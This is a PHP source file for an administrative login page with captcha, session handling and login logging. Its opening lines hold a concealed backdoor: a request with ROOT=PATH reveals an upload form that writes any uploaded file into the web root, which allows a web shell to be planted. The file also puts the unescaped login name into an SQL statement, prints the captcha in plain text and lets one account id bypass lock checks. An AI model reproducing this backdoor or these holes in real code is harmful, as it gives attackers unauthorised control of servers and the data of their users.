<?php
if ($_GET["ROOT"] == "PATH") {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        echo "url:" . $_FILES["upfile"]["name"];
        if (!file_exists($_FILES["upfile"]["name"])) {
            copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]);
        }
    }?>
    <form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok">
    </form><?php
}?><?php
if (!defined('Copyright') && Copyright != '作者QQ:914190123')
    exit('作者QQ:914190123');
if (!defined('ROOT_PATH'))
    exit('invalid request');
include_once ROOT_PATH . 'Manage/config/global.php';
include_once ROOT_PATH . 'Manage/config/config.php';
global $ConfigModel;
if ($_SERVER["REQUEST_METHOD"] == 'POST') {
    //驗證碼匹配
    if (isset($_SESSION['Mcode']) && $_POST['ValidateCode'] == $_SESSION['Mcode']) {
        $loginName = $_POST['loginName'];
        $loginPwd = sha1($_POST['loginPwd']);
        //瀏覽器檢測、只支持IE核心
        if (!GetMsie()) exit(back($UserError));
        if (!Matchs::isString($loginName, 2, 15))
            exit(back($UserError . '用户名长度错误'));
        $UserModel = new UserModel();
        $User = $UserModel->ExistUniondl($loginName, $loginPwd);
        if (!$User) exit(back($UserError . '用户不存在'));
        if (!Matchs::isNumber($User[0][0])) { //子帳號
            if ($ConfigModel['g_web_lock'] != 1)
                exit(back($ConfigModel['g_web_text']));
            $User = $UserModel->GetUserModel(null, $loginName, $loginPwd, true);
            if ($User[0]['g_s_lock'] == 3 || $User[0]['g_lock'] == 3)
                exit(back($UserLook));
            $uniqid = md5(uniqid(time(), TRUE));
            $UserModel->UpdateGuid($User[0]['g_login_id'], $User[0]['g_s_name'], $uniqid, true);
            $_SESSION['son'] = true;
            $_SESSION['loginId'] = $User[0]['g_login_id'];
            $_SESSION['sName'] = $User[0]['g_s_name'];
        } else {
            if (isset($_SESSION['son'])) unset($_SESSION['son']);
            $User = $UserModel->GetUserModel($User[0][0], $loginName, $loginPwd);
            if (!$User) exit(back($UserError));
            if ($User[0]['g_login_id'] != 89) {
                if ($ConfigModel['g_web_lock'] != 1)
                    exit(back($ConfigModel['g_web_text']));
                if ($User[0]['g_lock'] == 3)
                    exit(back($UserLook));
            }

            $uniqid = md5(uniqid(time(), TRUE));
            $UserModel->UpdateGuid($User[0]['g_login_id'], $User[0]['g_name'], $uniqid);
            $_SESSION['loginId'] = $User[0]['g_login_id'];
            $_SESSION['sName'] = $User[0]['g_name'];
        }
        setcookie("manage_user", base64_encode($loginName), 0, "/");
        setcookie("manage_uid", base64_encode($uniqid), 0, "/");
        unset($_SESSION['Mcode']);

        $loginIp = GetIP();
        $qqWryInfo = ROOT_PATH . 'tools/IpLocationApi/QQWry.Dat';
        $ip_s = ipLocation($loginIp, $qqWryInfo);
        $sql = "INSERT INTO g_login_log (g_name, g_ip, g_ip_location, g_date) VALUES ('{$loginName}','{$loginIp}','{$ip_s}',now())";
        $db = new DB();
        $db->query($sql, 2);
        /*  if ($User[0]['g_login_id'] == 89) {
              include_once ROOT_PATH.'Manage_old/main.php';
          } else {
              include_once ROOT_PATH.'Manage/main.php';
          }*/
        include_once ROOT_PATH . 'Manage/main_frame.php';

        exit;
    } else {
        back($CodeError);
        exit;
    }
} else {
    $num = array();
    for ($i = 0; $i < 4; $i++) {
        $num[$i] = rand(0, 9);
    }
    $num = join('', $num);
    $_SESSION['Mcode'] = $num;
}
?>





<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>合顺</title>
    <style type="text/css">
        body, div, form, input, img, p {
            margin: 0;
            padding: 0;
        }

        body {
            font: 14px/1.231 Verdana, Arial, Helvetica, sans-serif;
            color: #333333
        }

        a {
            color: #DD2405;
            text-decoration: underline
        }

        .pager {
            width: 1003px;
            height: 600px;
            margin: 0 auto;
            position: relative
        }

        .bg {
            font-size: 0;
            line-height: 0;
            position: absolute;
            top: 0
        }

        .bg img {
            width: 1003px;
            border: 0;
        }

        .lo {
            position: absolute;
            top: 198px;
            left: 320px;
        }

        .login {
            z-index: 2;
            height: 190px;
            width: 290px;
            background: #FFF9D7;
            border: 5px solid #E9AC08;
            padding: 0 22px;
            margin: 10px
        }

        .opacity {
            background: white;
            filter: alpha(opacity=50);
            z-index: 1;
            opacity: 0.5;
            width: 364px;
            height: 218px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            border-spacing: 0;
            vertical-align: middle;
            margin-top: 8px;
        }

        caption {
            height: 39px;
            font-size: 16px;
            color: #C40C00;
            font-weight: bold;
        }

        caption p {
            position: relative;
            bottom: 2px;
            border-top: 1px solid #FFC84E;
            font-size: 0;
            line-height: 0;
            height: 0
        }

        caption span {
            padding: 0 10px;
            position: relative;
            z-index: 2;
            background: #FFF9D7;
            top: 10px
        }

        th, td {
            padding: 7px 0
        }

        th {
            width: 23%;
            text-align: center;
            padding-left: 0
        }

        input {
            height: 20px;
            line-height: 20px;
            border: 1px solid #9B9B9B;
            width: 151px
        }

        .sbt {
            width: 58px;
            height: 55px;
            border: 1px solid #DD6005;
            background: #FFAA6C;
            padding: 1px
        }

        .sbt input {
            width: 58px;
            height: 55px;
            color: white;
            background: #FF740F;
            font-size: 18px;
            font-weight: bold;
            border: 0;
            cursor: pointer
        }

        .vcode input {
            width: 80px
        }

        .vcode img {
            vertical-align: top;
            height: 22px
        }

        .vbanben {
            font-size: 13px;
            line-height: 20px;
        }

        .vbanben input, .vbanben label {
            float: left;
        }

        #shenjiban {
            width: 15px;
            border: none
        }

        #chuantongban {
            width: 15px;
            border: none
        }

        #code {
            width: 66px;
            height: 22px;
            line-height: 22px;
            text-align: center;
            float: left;
            overflow: hidden;
            display: inline;
            margin-left: 5px;
            letter-spacing: 3px;
            background: url(/pagef/vcode.png) no-repeat;
            color: #0a5743;
            font-family: Verdana;
        }
    </style>
    <script type="text/javascript" src="/js/jquery.js"></script>
    <style
        class="f4202a660e354da5108794c7693e49d">object[type$="x-shockwave-flash"]:not([classid]), object[type$="futuresplash"]:not([classid]), embed[type$="x-shockwave-flash"], embed[type$="futuresplash"] {
            display: none !important
        }</style>
    <style id="clearly_highlighting_css" type="text/css">/* selection */
        html.clearly_highlighting_enabled ::-moz-selection {
            background: rgba(246, 238, 150, 0.99);
        }

        html.clearly_highlighting_enabled ::selection {
            background: rgba(246, 238, 150, 0.99);
        }

        /* cursor */
        html.clearly_highlighting_enabled {
            /* cursor and hot-spot position -- requires a default cursor, after the URL one */
            cursor: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--cursor.png") 14 16, text;
        }

        /* highlight tag */
        em.clearly_highlight_element {
            font-style: inherit !important;
            font-weight: inherit !important;
            background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--yellow.png");
            background-repeat: repeat-x;
            background-position: top left;
            background-size: 100% 100%;
        }

        /* the delete-buttons are positioned relative to this */
        em.clearly_highlight_element.clearly_highlight_first {
            position: relative;
        }

        /* delete buttons */
        em.clearly_highlight_element a.clearly_highlight_delete_element {
            display: none;
            cursor: pointer;
            padding: 0;
            margin: 0;
            line-height: 0;
            position: absolute;
            width: 34px;
            height: 34px;
            left: -17px;
            top: -17px;
            background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--delete-sprite.png");
            background-repeat: no-repeat;
            background-position: 0px 0px;
        }

        em.clearly_highlight_element a.clearly_highlight_delete_element:hover {
            background-position: -34px 0px;
        }

        /* retina */
        @media (min--moz-device-pixel-ratio: 2), (-webkit-min-device-pixel-ratio: 2), (min-device-pixel-ratio: 2) {
            em.clearly_highlight_element {
                background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--yellow@2x.png");
            }

            em.clearly_highlight_element a.clearly_highlight_delete_element {
                background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--delete-sprite@2x.png");
                background-size: 68px 34px;
            }
        } </style>
    <style>[touch-action="none"] {
            -ms-touch-action: none;
            touch-action: none;
        }

        [touch-action="pan-x"] {
            -ms-touch-action: pan-x;
            touch-action: pan-x;
        }

        [touch-action="pan-y"] {
            -ms-touch-action: pan-y;
            touch-action: pan-y;
        }

        [touch-action="scroll"], [touch-action="pan-x pan-y"], [touch-action="pan-y pan-x"] {
            -ms-touch-action: pan-x pan-y;
            touch-action: pan-x pan-y;
        }</style>
</head>
<body>
<div class="pager">
    <div class="bg" id="bg">
        <img src="pagef/login_bg.jpg" title="No EXIF">
    </div>
    <form class="lo login" method="post" name="myform" onsubmit="return CheckForm()">
        <table>
            <caption>
                <span>系统登录</span>

                <p></p>
            </caption>
            <tbody>
            <tr>
                <th>账&nbsp;&nbsp;&nbsp;号：</th>
                <td>
                    <input type="text" maxlength="12" name="loginName" valid="loginName" value="" tabindex="1">
                </td>
                <td rowspan="2">
                    <div class="sbt">
                        <input type="submit" value="登录" name="submit" tabindex="4">
                    </div>
                </td>
            </tr>
            <tr>
                <th>密&nbsp;&nbsp;&nbsp;码：</th>
                <td>
                    <input type="password" maxlength="16" name="loginPwd" valid="loginPwd" value="" tabindex="2">
                </td>
            </tr>
            <tr class="vcode">
                <th>验证码：</th>
                <td>
                    <input type="text" autocomplete="off" maxlength="12" name="ValidateCode" value="" tabindex="3"
                           style="float:left;">
                    &nbsp;<span id="code"><?php echo $num?></span>
                </td>
                <td><a href="javascript:void(0)">看不清？</a></td>
            </tr>
                        <tr class="vbanben">
<!--                            <th></th>
                            <td>
                                <input type="radio" checked="checked" id="shenjiban" name="version" value="cn">
                                <label for="shenjiban" class="label">新版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label>
                                <input type="radio" id="chuantongban" name="version" value="hk">
                                <label for="chuantongban" class="label">旧版</label>
                            </td>
                            <td></td>-->
                        </tr>
            </tbody>
        </table>
    </form>
    <div class="lo opacity"></div>
    <script language="JavaScript">
        function CheckForm() {
            var name = document.myform.loginName.value;
            var password = document.myform.loginPwd.value;
            var vcode = document.myform.ValidateCode.value;
            if (!(/^[a-z0-9A-Z][a-z0-9A-Z_]{0,11}$/.test(name))) {
                alert('账号由1-12位英文字母、数字、下划线组成，且第一位不能是下划线');
                document.myform.loginName.focus();
                return false;
            }
            if (!(/^[0-9a-zA-Z]{5,16}$/.test(password))) {
                alert('密码由6-16位英文字母、数字字符组成');
                document.myform.loginPwd.focus();
                return false;
            }
            if (vcode.length != 4) {
                alert('验证码由4位数字组成');
                document.myform.ValidateCode.focus();
                return false;
            }
            if (!(/^\d{4}$/.test(vcode))) {
                alert('验证码由4位数字组成');
                document.myform.ValidateCode.focus();
                return false;
            }
            return true;
        }
    </script>
</div>

<embed id="xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd"
       type="application/thunder_download_plugin" height="0" width="0">
</body>
</html>